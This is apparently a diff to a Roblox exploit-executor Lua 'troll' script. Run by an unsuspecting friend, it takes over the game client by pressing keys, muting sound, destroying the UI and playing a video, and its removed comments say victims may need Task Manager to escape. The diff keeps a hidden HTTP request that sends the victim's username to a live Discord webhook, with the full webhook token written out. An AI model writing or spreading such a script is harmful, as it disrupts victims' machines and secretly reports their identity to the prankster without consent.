@@ -1,9 +1,5 @@
 repeat task.wait() until isrbxactive()
 
--- fixed syntax errors - 1
--- removed useless stuff - 2
--- troll people with this! if you are stuck,  press alt, and close using "Task Manager"
-
 makefolder("plsdontclickme")
 
 local videos = {
@@ -95,11 +91,19 @@ keyrelease(0x7A)
 nosounds()
 disablelimitations()
 destroyui()
--- to check if ur friend clicked it, heres a webhook!
 
-local data = game:GetService("HttpService"):JSONEncode({username = tostring(math.random(1,100)), content=[[
-    User ran script!
+local data = game:GetService("HttpService"):JSONEncode({
+    username = tostring(math.random(1,100)),
+    content = [[
+User ran script!
 ]] .. game.Players.LocalPlayer.Name .. " (" .. chosen.name .. ")"
-request({Url=                     "https://discordapp.com/api/webhooks/1398005198873694339/Z3vpTs1FFb51zz89ZLdMw6Mo2nQDe0ucyU5J4favgWkYjt-hfC54UpC4mxB8J47ktOm6"                       , Method="POST", Headers={["Content-Type"]="application/json"}, Body=data})
+})
+
+request({
+    Url = "https://discordapp.com/api/webhooks/1398005198873694339/Z3vpTs1FFb51zz89ZLdMw6Mo2nQDe0ucyU5J4favgWkYjt-hfC54UpC4mxB8J47ktOm6",
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = data
+})
 
 videoplay(chosen.name)
